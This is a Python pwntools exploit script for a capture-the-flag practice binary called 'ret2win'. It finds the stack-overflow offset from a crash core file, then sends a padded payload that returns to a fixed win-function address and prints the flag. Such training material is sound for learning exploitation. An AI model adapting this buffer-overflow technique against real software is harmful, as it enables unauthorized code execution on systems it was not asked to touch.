#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ret2win
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('ret2win')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

# enable logging
context.log_level = 'debug'

# Find the offset
# start the process
io = process(exe.path)

# send the cyclic
io.sendline(cyclic(128))

# wait for the crash
io.wait()

# read the corefile
core = io.corefile

# read the stack pointer at the time of the crash
stack = core.rsp
info("stack: %#x", stack)

# read 4 abytes form the stack pointer: this is our offset
pattern = core.read(stack, 4)
offset = cyclic_find(pattern)
info("pattern: %r", pattern)
info("offset: %d", offset)

# CONSTANTS
ret2win_func = 0x400812

# build our ROP chain/payload
rop_chain = p64(ret2win_func, endian="little")
padding = cyclic(offset)
payload = padding + rop_chain # + p8(0x00, endian="little")
info("ROP payload: %s", payload)
info("ROP Len: %d", len(payload))

# open a new process to pwn
io = process(exe.path)

# send off our ROP payload
io.sendline(payload)
io.wait_for_close()
lines = io.recv().decode().split('\n')
flag = None
for line in lines:
    if 'flag' in line:
        flag = line
        break
log.success(flag)

